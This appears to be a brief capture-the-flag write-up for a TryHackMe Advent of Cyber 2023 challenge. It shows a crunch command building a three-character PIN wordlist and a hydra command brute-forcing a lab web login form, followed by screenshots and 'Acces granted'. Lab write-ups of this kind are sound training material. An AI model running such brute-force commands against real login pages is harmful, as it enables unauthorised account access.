# Day 2

![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/86c03667-b93e-4e16-9d02-74c409f88ea6)
![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/1c81a9f1-4649-4232-b609-8eabad750d2a)


## Generating password wordlist with crunch
```s
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```
![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/44c735dc-8ed4-472e-b7d1-af5291b0fb5d)


## Cracking with hydra
```s
hydra -l '' -P 3digits.txt -f -v 10.10.174.107 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```
![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/72875a73-ea57-4b6f-9363-97fc988a72f8)
![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/fcd09e81-2474-4ea7-8616-0ebaf2f758c5)

Acces granted
![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/64d6ae96-ecc6-4307-b6e1-4cc05a1ccd55)

